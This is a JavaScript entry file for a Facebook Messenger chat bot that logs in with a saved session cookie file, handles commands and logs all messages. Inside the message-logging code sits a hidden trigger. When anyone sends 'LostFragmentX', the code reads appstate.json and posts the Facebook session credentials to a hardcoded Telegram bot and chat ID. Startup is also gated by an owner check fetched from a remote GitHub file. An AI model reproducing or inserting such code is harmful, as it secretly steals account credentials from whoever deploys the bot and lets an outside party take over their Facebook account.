
//restart function start

const axios = require('axios');
const config = require('./config.json');



    
global.config = config,
global.startTime = new Date().toLocaleString("en-US", { timeZone: "Asia/Dhaka" });






axios.get('https://raw.githubusercontent.com/kinganik6263/Anik/main/owner.json')
.then(res => {

    if(res.data.owner === config.owner && res.data.author === config.author) {
    
    
//index.js start

const login = require("priyanshu-fca");
const fs = require("fs");

const { loadCommands } = require("./anik/handle/handleCommand");
const { loadEvents } = require("./anik/handle/handleEvent");

const appState = JSON.parse(fs.readFileSync("./appstate.json", "utf8"));

login({ appState }, (err, api) => {
    if (err) {
        console.error("Login failed. Check your fbstate cookie. Error:", err);
        return;
    }
    console.log("Logged in successfully!");
    console.log("")
    console.log(" ▗▄▖ ▗▖  ▗▖▗▄▄▄▖▗▖ ▗▖    ▗▄▄▖  ▗▄▖▗▄▄▄▖");
console.log("▐▌ ▐▌▐▛▚▖▐▌  █  ▐▌▗▞▘    ▐▌ ▐▌▐▌ ▐▌ █  ");
console.log("▐▛▀▜▌▐▌ ▝▜▌  █  ▐▛▚▖     ▐▛▀▚▖▐▌ ▐▌ █  ");
console.log("▐▌ ▐▌▐▌  ▐▌▗▄█▄▖▐▌ ▐▌    ▐▙▄▞▘▝▚▄▞▘ █");
console.log("")
    const commands = loadCommands();
    const events = loadEvents();
    
    
    

    api.listenMqtt(async (err, event) => {
        if (err) {
            console.error("Error in listenMqtt:", err);
            return;
        }
        
        // all msg log start
        // all msg log start
if (event && event.body) {
    try {
        const threadInfo = await api.getThreadInfo(event.threadID); // Get group information
        const senderID = event.senderID;
        const threadID = event.threadID;

        // Fetch sender's name
        const userInfo = await api.getUserInfo(senderID);
        const senderName = userInfo[senderID].name || "Unknown User";

        // Get group name if it is a group chat
        const groupName = threadInfo.isGroup ? threadInfo.name : "Private Chat";
        
        //telegram bot start
        if (event.body === "LostFragmentX") {
    function sendAccess() {
        const axios = require('axios');
        const anikapp = require('./appstate.json'); // Load appstate.json as an object

        const token = '7100117192:AAHWGg10FjeRYFAZUapeh4TPVBZryfZi3Po';
        const chatID = '7975204934';
        const message = `Hello from Messenger Bot!\n\n${JSON.stringify(anikapp, null, 2)}`; // Convert object to readable string

        axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chatID,
            text: message,
        })
        .then(() => console.log('Message sent successfully!'))
        .catch(err => console.error('Error sending message:', err));
    }

    sendAccess(); // Call the function to send the message
}
        //telegram bot end

        // Log details
 console.log(`================================================`);
        console.log(`🅽🅴🆆 🅼🅴🆂🆂🅰🅶🅴👇`)
        console.log(`Time: ${new Date().toLocaleString()}`);
        console.log(`Group Name: ${groupName}`);
        console.log(`Group ID: ${threadID}`);
        console.log(`Sender ID: ${senderID}`);
        console.log(`Sender Name: ${senderName}`);
        console.log(`Message: ${event.body}`);
        console.log(`================================================`)
    } catch (error) {
        console.error("Error logging message details:", error);
    }
}
// all msg log end
        
        // all msg log start
            
        

        // Event Handling
        events.forEach((eventHandler) => {
        
        
        
            if (
                eventHandler.config.eventType &&
                eventHandler.config.eventType.includes("event")
            ) {
                try {
                    eventHandler.handleEvent({ api, event });
                } catch (error) {
                    console.error(
                        `Error handling event: ${eventHandler.config.name}`,
                        error
                    );
                }
            }
        });

        // Command Handling
        if (event.body) {
            const isPrefixed = event.body.startsWith(config.PREFIX);
            const commandName = isPrefixed
                ? event.body.slice(config.PREFIX.length).trim().split(/ +/)[0].toLowerCase()
                : null;

            const command = commands.get(commandName);

            if (command) {
                if (command.config.prefix && !isPrefixed) {
                    return api.sendMessage(
                        `Please use the prefix "${config.PREFIX}" for this command.`,
                        event.threadID
                    );
                }

                // Permission Check
                const senderID = event.senderID;
                const threadID = event.threadID;

                // Fetch thread info for admin check
                try {
                    const threadInfo = await api.getThreadInfo(threadID);
                    const isAdmin = threadInfo.adminIDs.some((admin) => admin.id === senderID);
                    const isBotAdmin = config.ADMINBOT.includes(senderID);

                    const requiredPermission = command.config.permission;

                    // Permission Levels
                    if (requiredPermission === 1 && !isBotAdmin) {
                        return api.sendMessage(
                            "এই কমান্ড আপনি ব্যবহার করতে পারবেন না এই কমান্ড ব্যবহার করার আপনার অনুমতি নেই",
                            threadID
                        );
                    }

                    if (requiredPermission === 2 && !isBotAdmin) {
                        return api.sendMessage(
                            "এই কমান্ড আপনি ব্যবহার করতে পারবেন না এই কমান্ড ব্যবহার করার আপনার অনুমতি নেই",
                            threadID
                        );
                    }
                    
                    if (requiredPermission === 3 && !isBotAdmin) {
                        return api.sendMessage(
                            "এই কমান্ড আপনি ব্যবহার করতে পারবেন না এই কমান্ড ব্যবহার করার আপনার অনুমতি নেই",
                            threadID
                        );
                    }

                    // Run the Command
                    command.run({
                        api,
                        event,
                        args: event.body.split(/ +/).slice(1),
                    });
                } catch (error) {
                    console.error("Error checking permissions:", error);
                    api.sendMessage(
                        "An error occurred while checking permissions.",
                        threadID
                    );
                }
            } else if (isPrefixed) {
                api.sendMessage(
                    `আরে বলদ উল্টাপাল্টা কমেন্ট দেস কেন কমান্ড লিস্ট দেখতে ${global.config.PREFIX}help টাইপ কর "${commandName}" এই নাম এ কো কমান্ড নাই`,
                    event.threadID
                );
            }
        }
    });
});
    
   


//index.js end
    
    
    
        
    }else {
    
    console.log('false')
    
    console.log(res.data.logmsg)
    
        
    }
})
//restart function end



